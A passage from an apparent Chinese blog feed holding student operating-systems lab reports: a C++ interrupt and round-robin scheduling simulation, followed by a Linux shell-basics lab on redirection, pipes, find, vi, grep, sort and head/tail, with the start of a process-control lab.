class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PCB</span> //进程结构体</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">int</span> time_slice; <span class="hljs-comment">//时间片</span><br><span class="hljs-keyword">int</span> time_remain; <span class="hljs-comment">//进程剩余运行时间</span><br><span class="hljs-keyword">int</span> id; <span class="hljs-comment">//进程id</span><br>&#125;;<br><br>queue&lt;PCB&gt; p;  <span class="hljs-comment">//进程的就绪队列</span><br>PCB process;   <span class="hljs-comment">//当前进程</span><br><span class="hljs-keyword">time_t</span> t;   <span class="hljs-comment">//存储日历时间类型</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tm</span> *<span class="hljs-title">cc</span>;</span> <span class="hljs-comment">//用来保存时间和日期的结构</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">time_caculate</span><span class="hljs-params">(<span class="hljs-keyword">int</span> timer)</span> <span class="hljs-comment">//计算当前时间</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;现在时间是：&quot;</span> &lt;&lt; endl;<br>cc-&gt;tm_hour += timer / <span class="hljs-number">3600</span>;<br>timer %= <span class="hljs-number">3600</span>;<br>cc-&gt;tm_min += timer / <span class="hljs-number">60</span>;<br>timer %= <span class="hljs-number">60</span>;<br>cc-&gt;tm_sec += timer;<br>cout &lt;&lt; <span class="hljs-built_in">asctime</span>(cc);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process_init</span><span class="hljs-params">(queue&lt;PCB&gt; &amp;p)</span> <span class="hljs-comment">//进程初始化，给定一些进程的初值</span></span><br><span class="hljs-function"></span>&#123;<br>PCB ex[<span class="hljs-number">4</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>&#123;<br>ex[i].id = i + <span class="hljs-number">1</span>;<br>ex[i].time_slice = <span class="hljs-number">2</span>;<br>ex[i].time_remain = <span class="hljs-number">2</span> + i;<br>p.<span class="hljs-built_in">push</span>(ex[i]);<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process_save</span><span class="hljs-params">()</span> <span class="hljs-comment">//中断发生时的进程保存</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;正在保护现场···&quot;</span> &lt;&lt; endl;<br>process.time_remain--; <span class="hljs-comment">//每产生一次时钟中断经处理后，被中断进程时间减1</span><br>process.time_slice--;  <span class="hljs-comment">//时间片也减1</span><br><br>cout &lt;&lt; <span class="hljs-string">&quot;现场保护完成&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;---------------------------------------&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">process_schedule</span><span class="hljs-params">(<span class="hljs-keyword">int</span> ir, <span class="hljs-keyword">int</span> timer)</span></span><br><span class="hljs-function"></span>&#123;<br><br><span class="hljs-keyword">if</span> (process.time_remain == <span class="hljs-number">0</span>)<br>ir = <span class="hljs-number">1</span>; <span class="hljs-comment">//标记进程已结束或中断，需要切换进程</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (process.time_slice == <span class="hljs-number">0</span>)<br>&#123;<br>ir = <span class="hljs-number">1</span>;<span class="hljs-comment">//当前进程已结束或中断，需要切换进程</span><br>process.time_slice = <span class="hljs-number">2</span>; <span class="hljs-comment">//恢复时间片</span><br>p.<span class="hljs-built_in">push</span>(process);<span class="hljs-comment">//再次放入就绪队列</span><br>&#125;<br><span class="hljs-keyword">else</span><br>ir = <span class="hljs-number">-1</span>; <span class="hljs-comment">//当前进程继续运行</span><br><span class="hljs-keyword">if</span> (ir == <span class="hljs-number">1</span>)<br>&#123;<br><br>cout &lt;&lt; <span class="hljs-string">&quot;正在进行处理器调度···&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;---------------------------------------&quot;</span> &lt;&lt; endl;<br>process = p.<span class="hljs-built_in">front</span>();<br><span class="hljs-keyword">if</span> (!p.<span class="hljs-built_in">empty</span>())<br>p.<span class="hljs-built_in">pop</span>();<br><span class="hljs-keyword">else</span><br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;所以进程已经执行完成,时间过去了&quot;</span> &lt;&lt; timer &lt;&lt; <span class="hljs-string">&quot;s&quot;</span> &lt;&lt; endl;<br><span class="hljs-built_in">time_caculate</span>(timer); <span class="hljs-comment">//进程队列为空则结束，计算时间</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">//返回0表示结束程序</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ir == <span class="hljs-number">-1</span>)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;正在进行处理器调度···&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;---------------------------------------&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br><span class="hljs-keyword">int</span> timer = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">int</span> counter = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">int</span> clock_alarm;<br><span class="hljs-keyword">int</span> ir = <span class="hljs-number">0</span>; <span class="hljs-comment">//中断寄存器</span><br><br><span class="hljs-built_in">process_init</span>(p); <span class="hljs-comment">//初始化进程</span><br><br><span class="hljs-built_in">time</span>(&amp;t);<br>cc = <span class="hljs-built_in">localtime</span>(&amp;t);<br><br>cout &lt;&lt; <span class="hljs-string">&quot;开机时间：&quot;</span> &lt;&lt; <span class="hljs-built_in">asctime</span>(cc);<br>cout &lt;&lt; <span class="hljs-string">&quot;定时闹钟的设定值为：&quot;</span>;<br>cin &gt;&gt; clock_alarm;<br>cout &lt;&lt; endl;<br><br>process = p.<span class="hljs-built_in">front</span>();<br>p.<span class="hljs-built_in">pop</span>();<br><span class="hljs-keyword">while</span> (clock_alarm != <span class="hljs-number">0</span>)<br>&#123;<br><br>cout &lt;&lt; <span class="hljs-string">&quot;进程&quot;</span> &lt;&lt; process.id &lt;&lt; <span class="hljs-string">&quot;正在执行&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;当前进程剩余的时间片：&quot;</span> &lt;&lt; process.time_slice &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;当前进程剩余执行时间：&quot;</span> &lt;&lt; process.time_remain &lt;&lt; endl;<br>counter++;<br>cout &lt;&lt; <span class="hljs-string">&quot;是否有中断产生，1是，0否：&quot;</span>; <span class="hljs-comment">//每输入一次频率设置为1s</span><br>cin &gt;&gt; ir;<br><span class="hljs-keyword">if</span> (ir == <span class="hljs-number">0</span>)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;未发生中断，进程继续执行&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">process_save</span>();<br>timer++;<br>clock_alarm--;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">process_schedule</span>(ir, timer) == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br>cout &lt;&lt; <span class="hljs-string">&quot;定时结束，时间过去了&quot;</span> &lt;&lt; timer &lt;&lt; <span class="hljs-string">&quot;s&quot;</span> &lt;&lt; endl;<br><span class="hljs-built_in">time_caculate</span>(timer);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="程序初值和运行结果-1"><a href="#程序初值和运行结果-1" class="headerlink" title="程序初值和运行结果"></a>程序初值和运行结果</h4><p>clock_alarm设定值为4</p><p><img src="/2021/11/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%AE%9E%E9%AA%8C%E4%B8%AD%E6%96%AD%E5%A4%84%E7%90%86/image-20211112115344801.png" alt="image-20211112115344801"></p><p>clock_alarm设定值为5</p><p><img src="/2021/11/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%AE%9E%E9%AA%8C%E4%B8%AD%E6%96%AD%E5%A4%84%E7%90%86/image-20211112115544971.png" alt="image-20211112115544971"></p><p>当所有进程运行时间小于定时闹钟设定值时：</p><p><img src="/2021/11/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%AE%9E%E9%AA%8C%E4%B8%AD%E6%96%AD%E5%A4%84%E7%90%86/image-20211112120044861.png" alt="image-20211112120044861"></p><p><img src="/2021/11/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%AE%9E%E9%AA%8C%E4%B8%AD%E6%96%AD%E5%A4%84%E7%90%86/image-20211112120118837.png" alt="image-20211112120118837"></p><h3 id="五、实验总结"><a href="#五、实验总结" class="headerlink" title="五、实验总结"></a>五、实验总结</h3><p>对于只有中断的程序设计较为简单，设置一个定时时钟，然后进行中断判断，当输入为1时，中断进程，定时闹钟减一，输入为0时，继续执行当前进程。</p><p>对于思考题，需要考虑时间片轮转调度，程序主要思路就是当进程运行时间或者时间片结束时，切换进程，否则继续执行当前进程。</p><p>这个实验相对较为容易，只考虑了就绪队列和当前运行进程。</p><p>通过这次模拟实验，我了解了中断的过程以及中断处理程序的作用，当CPU收到中断或者异常的信号时，它会暂停执行当前的程序或任务然后通过进程调度函数进行进程切换。</p><p>同时也进行了许久没写过的C++编程，代码太久没编果然会生疏，很多简单的思路总是想不清楚，但总算最后顺利完成了，还是有很多收获的。</p>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>操作系统实验二</title>
    <link href="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/"/>
    <url>/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="操作系统第二次实验"><a href="#操作系统第二次实验" class="headerlink" title="操作系统第二次实验"></a>操作系统第二次实验</h1><h2 id="实验4-shell初步"><a href="#实验4-shell初步" class="headerlink" title="实验4 shell初步"></a>实验4 shell初步</h2><h3 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h3><ul><li>熟悉shell的基本操作</li><li>使用LINUX中最常用的数据处理命令</li></ul><h3 id="二、实验要求"><a href="#二、实验要求" class="headerlink" title="二、实验要求"></a>二、实验要求</h3><ul><li>使用通配符来进行文件名的查找</li><li>重定向标准输入、标准输出、标准错误输出</li><li>使用管道操作，将一个进程的输出作为另一个进程的输入</li><li>使用群命令和命令行续行符</li><li>在指定的目录中，对满足条件的文件名进行递归查找</li><li>了解vi编辑器的基本用法</li><li>在文本文件中，查找符合指定模式的文本行</li><li>将文本文件中的各行，按顺序排列</li><li>显示一个文本文件的前几行或者后几行</li></ul><h3 id="三、实验预备知识"><a href="#三、实验预备知识" class="headerlink" title="三、实验预备知识"></a>三、实验预备知识</h3><h4 id="1-shell简介"><a href="#1-shell简介" class="headerlink" title="1. shell简介"></a>1. shell简介</h4><p>shell是一个命令解释程序， 它提供了操作系统与用户之间的主要界面，控制用户与内核之间的交互作用。</p><p>除了解释用户从键盘上键入的命令外，shell也可以解释存储在文件中的命令。在Linux中，存储命令的文本文件称为shell脚本，可以具有任意的扩展名。shell实际上是一种编程语言，shell编程广泛地用于获取经常执行的命令和过程。</p><h4 id="2-shell特殊变量"><a href="#2-shell特殊变量" class="headerlink" title="2. shell特殊变量"></a>2. shell特殊变量</h4><p>$?——上一条命令的执行情况<br>$#——命令行参数的个数<br>$*——所有命令行参数的内容<br>$@——所有命令行参数的内容<br>​$n——命令行的第n个参数<br>$$——当前shell程序的pid<br>$!——最近一个在后台运行的命令的pid<br>$-——当前选项标志<br>$_——上一条命令的最后一个参数</p><h4 id="3-shell脚本"><a href="#3-shell脚本" class="headerlink" title="3. shell脚本"></a>3. shell脚本</h4><ul><li>建立shell脚本<br>可以用来建立文本文件的方法都可以用来建立shell脚本。例如，可以用vi编辑器或是emacs编辑器来建立一个shell脚本，也可以通过重定向标准输入和输出在命令行上直接建立shell脚本文件。<br>如下使用cat命令建立shell脚本：<br>cat &gt; print_user<br>echo User name:$LOGNAME<br>echo Home directory: ​$HOME<br>echo Current shell PID: $$<br>&lt;Ctrl+D&gt;</li><li>执行shell脚本<br>(1)用子shell执行shell脚本文件要用子shell执行的脚本文件print_user，可以键入如下命令：<br>$sh print_user<br>(2)用“.”命令执行shell脚本文件<br>“.”命令的一般形式为：<br>​$ . shell脚本文件名<br>(3)用exec命令执行shell脚本文件<br>该命令的一般形式为：<br>​$ exec .／shell脚本文件名</li></ul><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030085349663.png" alt="image-20211030085349663"></p><h3 id="四、实验内容"><a href="#四、实验内容" class="headerlink" title="四、实验内容"></a>四、实验内容</h3><h4 id="1-通配符"><a href="#1-通配符" class="headerlink" title="1. 通配符"></a>1. 通配符</h4><ul><li>通配符用于模式匹配，如文件名匹配、路经名搜索、字符串查找等。常用的通配符有*、?和括在方括号[ ]中的字符序列。用户可以在作为命令参数的文件名中包</li><li>含这些通配符，构成一个所谓的“模式串”，在执行过程中进行模式匹配。</li><li>*代表任何字符串（长度可以不等，可以为空字符串）。<br>例如：“a*”匹配以a打头的任意字符串。</li><li>？代表任何单个字符。</li><li>[ ]代表指定的一个字符范围，只要文件名中[ ]位置处的字符在[ ]中指定的范围之内，那么这个文件名就与这个模式串匹配。</li></ul><h4 id="2-重定向"><a href="#2-重定向" class="headerlink" title="2. 重定向"></a>2. 重定向</h4><p>重定向就是将标准输入、标准输出甚至标准报错重定向到一个文件。也就是说，可以让命令从某个文件中读取参数和数据，命令的输出结果也可以送至某个文件中而不是在终端上显示出来。实现重定向的最简单的方法是使用改向操作符。改向操作符可以将标准输入、标准输出和标准报错改向到某个文件。</p><blockquote><p>例：将显示结果重定向到file文件当中。</p><p>$ls –l &gt; file</p></blockquote><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030094311466.png" alt="image-20211030094311466"></p><p>另一 种实现重定向的方法是使用管道(|)，它将一条命令的输出发送到另一条命令的输入。</p><blockquote><p>例：将文件junk作为信件的内容，给自己发个mail</p><p>$cat junk|mail 用户名</p></blockquote><h4 id="3-管道及tee"><a href="#3-管道及tee" class="headerlink" title="3. 管道及tee"></a>3. 管道及tee</h4><p>管道操作符将一条命令的输出定向到另一条命令的输入，而不是定向到终端或文件。</p><blockquote><p> 例：使用一个管道操作来计算当前目录中的文件数目</p><p> $ls | wc -w</p></blockquote><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030100427858.png" alt="image-20211030100427858"></p><p>tee命令作用可以用字母T来形象地表示。它把输出的一个副本输送到标准输出，另一个副本拷贝到相应的文件中。</p><blockquote><p>例：将上述命令的结果同时输出到文件junk当中<br>$ls | wc –w | tee junk </p></blockquote><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030100611018.png" alt="image-20211030100611018"></p><h4 id="4-群命令及续行符"><a href="#4-群命令及续行符" class="headerlink" title="4. 群命令及续行符"></a>4. 群命令及续行符</h4><p>如果希望在成功地执行一个命令之后再执行另一个命令，或者在一个命令失败后再执行另一个命令，&amp;&amp;和||可以完成这样的功能。相应的命令可以是系统命令或shell脚本。</p><p>shell还提供了在当前shell或子shell中执行一组命令的方法，即使用（）和{ }。</p><blockquote><p>例：调用如下命令：显示日期；显示已经登录到系统中的所有用户名；显示当前目录的名称；显示当前目录中的所有文件名。<br>$ date; who; pwd; ls -a<br>这组命令将按顺序执行，不管前一命令是否出错，后一命令继续执行</p></blockquote><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030100659567.png" alt="image-20211030100659567"></p><blockquote><p>例：将file1中的内容拷贝到file2当中，如果拷贝成功 ，则回应一个消息。<br>$cp file1 file2 &amp;&amp; echo “cp is successful!”</p></blockquote><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030100841129.png" alt="image-20211030100841129"></p><blockquote><p>例：使用||，实现若拷贝操作不成功，则返回一个消息。<br>$cp file3 file1 || echo “cp is failed!”</p></blockquote><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030101131852.png" alt="image-20211030101131852"></p><blockquote><p>例：在上面的例子当中，若拷贝失败，则回应一个消息，并给自己发送一封邮件，最后退出。<br>$cp file3 file1 || (echo“cp is failed!”；mail chen ;  exit)</p></blockquote><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030103318759.png" alt="image-20211030103318759"></p><h4 id="5-find命令"><a href="#5-find命令" class="headerlink" title="5. find命令"></a>5. find命令</h4><p>find是一个非常有效的工具，它可以遍历当前目录甚至于整个文件系统来查找某些文件或目录。</p><p>find命令的一般形式为：find pathname -options [-print – exec –ok]</p><ul><li>pathname：find命令所查找的目录路径。</li><li>-print：find命令将匹配的文件输出到标准输出。</li><li>-exec：find命令对匹配的文件执行该参数所给出的shell命令。</li><li>-ok 和- exec的作用相同，只不过在执行每一个命<br>令之前，都会给出提示，让用户来确定是否执行</li></ul><blockquote><p>例：在你的用户主目录中查找所有以字母s开头的件名。而后，对它们自动执行ls –l命令<br>$ find ~ -name “s*” -type f -exec ls -l {} \；</p></blockquote><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030104212448.png" alt="image-20211030104212448"></p><blockquote><p>例：重复上一步的查找。不同的是，对查找的文件名执行ls –l命令时，采用与用户进行交互的方式。<br>$ find ~ -name “s*” -type f -ok ls -l {} \；</p></blockquote><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030104507621.png" alt="image-20211030104507621"></p><blockquote><p>例：在/usr目录中，查找所有用户zino拥有的文件。而后，计算出这些文件的个数。并将所有的错误信息重定向到一个名为errfile的文件中。<br>$ find /usr/ -user zino -print 2&gt; errfile | wc -l</p></blockquote><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030104831707.png" alt="image-20211030104831707"></p><h4 id="6-vi编辑器"><a href="#6-vi编辑器" class="headerlink" title="6. vi编辑器"></a>6. vi编辑器</h4><p>vi编辑器是UNIX的强有力的文本文件编辑工具，利用它可以建立、修改文本文件。</p><h5 id="1-vi编辑器的进入："><a href="#1-vi编辑器的进入：" class="headerlink" title="(1) vi编辑器的进入："></a>(1) vi编辑器的进入：</h5><p>vi 文件名(自动进入命令方式)。</p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030105126128.png" alt="image-20211030105126128" style="zoom: 80%;"><h5 id="2-vi编辑器的退出："><a href="#2-vi编辑器的退出：" class="headerlink" title="(2) vi编辑器的退出："></a>(2) vi编辑器的退出：</h5><p>在指令模式下键入:q，:q!，:wq或:x(注意:号), 就会退出vi。其中:wq和:x是存盘退出，而:q是直接退出。</p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030105205014.png" alt="image-20211030105205014" style="zoom:80%;"><h5 id="3-基本编辑指令"><a href="#3-基本编辑指令" class="headerlink" title="(3) 基本编辑指令"></a>(3) 基本编辑指令</h5><ul><li><p>新增 (append)</p><ul><li>a ：从光标所在位置后面开始新增资料。</li><li>A： 从光标所在列最后面的地方开始新增加资料</li></ul></li><li><p>插入 (insert)</p><ul><li>i： 从光标所在位置前面开始插入资料。</li><li>I ：从光标所在列的第一个非空白字元前面开始插入资料。</li></ul></li><li><p>开始 (open)</p><ul><li>o ：在光标所在列下新增一列并进入输入模式。</li><li>O: 在光标所在列上方新增一列并进入输入模式。</li><li>x： 删除光标所在字符。</li><li>dd ：删除光标所在的列。</li><li>r ：修改光标所在字元，r 后接著要修正的字符。</li><li>R：进入取替换状态，新增文字会覆盖原先文字，直到按[ESC] 回到指令模式下为止。</li><li>s： 删除光标所在字元，并进入输入模式。</li><li>S： 删除光标所在的列，并进入输入模式。</li></ul></li></ul><h4 id="7-grep命令"><a href="#7-grep命令" class="headerlink" title="7. grep命令"></a>7. grep命令</h4><p>grep命令从指定的输入文件中查找与指定的正则表达式相匹配的行。默认情况下，grep命令将输出所找到<br>的匹配行。</p><p>grep命令的一般形式如下：grep [options] [regular-expression] [file1, file2, …]</p><p>其中，options指定grep命令的各种选项，regularexpression指定用来查找的正则表达式，file1，file2，…等参数是要查找的输入文件名。在最简单的情况下，用来查找的正则表达式可以是简单的字符串。</p><blockquote><p>例：在文件/etc/passwd中，找出所有以nm开头的用户名所在的文本行。<br>$ grep ‘^nm’ /etc/passwd</p></blockquote><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030105817077.png" alt="image-20211030105817077"></p><blockquote><p>例：在文件/etc/passwd中，找出所有以nologin结尾的文本行。<br>$grep ‘nologin$’ /etc/passwd</p></blockquote><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030105940431.png" alt="image-20211030105940431"></p><blockquote><p>例：在文件/etc/passwd中，找出所有包含root的文体行，并将输出重定向到passwd.out文件当中<br>$grep ‘root’ /etc/passwd &gt; passwd</p></blockquote><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030110907325.png" alt="image-20211030110907325"></p><h4 id="8-sort命令"><a href="#8-sort命令" class="headerlink" title="8. sort命令"></a>8. sort命令</h4><p>sort命令的功能是对文件中的各行进行排序，并结果显示在标准输出上。如不指定输入文件或使用“-”，则表示排序内容来自标准输入。</p><p>sort 命令的一般形式为：sort [options] file</p><blockquote><p>例：以字母顺序显示/etc/passwd文件的内容。然后，以逆序显示其内容。<br>$ sort /etc/passwd<br>$ sort -r /etc/passwd</p></blockquote><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030111144737.png" alt="image-20211030111144737"></p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030111139595.png" alt="image-20211030111139595"></p><h4 id="9-head命令与tail命令"><a href="#9-head命令与tail命令" class="headerlink" title="9. head命令与tail命令"></a>9. head命令与tail命令</h4><blockquote><p>例： 显示/etc/passwd文件的前10行的内容<br>$ head -10 /etc/passwd</p></blockquote><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030111210783.png" alt="image-20211030111210783"></p><blockquote><p>例：显示/etc/passwd文件的前5行的内容<br>$ head -5 /etc/passwd</p></blockquote><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030111238931.png" alt="image-20211030111238931"></p><blockquote><p>例：显示/etc/passwd文件的后10行的内容<br>$ tail -10 /etc/passwd</p></blockquote><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030111258622.png" alt="image-20211030111258622"></p><h2 id="实验5-控制进程"><a href="#实验5-控制进程" class="headerlink" title="实验5 控制进程"></a>实验5 控制进程</h2><h3 id="一、实验目的-1"><a href="#一、实验目的-1" class="headerlink" title="一、实验目的"></a>一、实验目的</h3><ul><li>熟悉进程的操作与控制</li><li>掌握使用linux命令管理和操作进程的方法</li></ul><h3 id="二、实验要求-1"><a href="#二、实验要求-1" class="headerlink" title="二、实验要求"></a>二、实验要求</h3><ul><li>使用ps与jobs命令监视进程</li><li>使用kill与jobs命令控制进程</li><li>显示当前进程的ID</li></ul><h3 id="三、实验预备知识-1"><a href="#三、实验预备知识-1" class="headerlink" title="三、实验预备知识"></a>三、实验预备知识</h3><h4 id="1、多用户"><a href="#1、多用户" class="headerlink" title="1、多用户"></a>1、多用户</h4><p>LINUX操作系统的一个优点就是，它完全是作为一个多用户的系统设计的，LINUX操作系统提供了分时操作功能。多用户功能，不仅仅在于同时为多个用户提供计算支持，它还应包括为系统中的各个用户的数据提供保护方案。在多用户的支持下，用户们可以在同一台计算机上同时进行不同的操作，还可以同时协调完成同一任务。</p><h4 id="2、多任务"><a href="#2、多任务" class="headerlink" title="2、多任务"></a>2、多任务</h4><p>多任务是指在同一时间内可以同时启动多个程序，各个程序同时运行，协调地使用系统资源。多任务的实现需要由操作系统来支持，不同程序的运行需要由操作系统来调度。从多任务实现的角度来说，多任务分为两类：协作式多任务和抢占式多任务。</p><h4 id="3、进程"><a href="#3、进程" class="headerlink" title="3、进程"></a>3、进程</h4><p>进程是操作系统中可以独立调度的单元，每个执行的任务都成为进程，可以看作是程序的一次执行</p><p>程序和进程的概念差别在于：程序是一些数据和指令的集合，它通常是以文件的形式存在，并且一旦程序生成后，除非删除它，否则它将一直存在。而进程是一个动态的概念，它是程序的一次执行。从系统的角度来说，进程是操作系统用于调度的基本单位，进程是可以独立拥有系统资源的单位。它具有几个特性：并行性、异步性、互斥性。</p><h4 id="4、作业"><a href="#4、作业" class="headerlink" title="4、作业"></a>4、作业</h4><p>作业（job）这个概念最早出现在批处理系统中。作业是用户向计算机系统提交一项工作的基本单位，是用户在一次事务处理或计算过程中要求计算机所做工作的总和。</p><h4 id="5、进程和作业"><a href="#5、进程和作业" class="headerlink" title="5、进程和作业"></a>5、进程和作业</h4><p>作业是用户向计算机系统提交一项工作的基本单位，是用户在一次事务处理或计算过程中要求计算机所做工作的总和，是描述用户向系统提交工作任务的实体单位 。进程是一个具有一定独立功能的程序关于某个数据集合的一次运行活动，是操作系统分配资源和进行调度的基本单位，是系统完成工作任务时程序执行的实体单位。</p><h4 id="6、前台和后台"><a 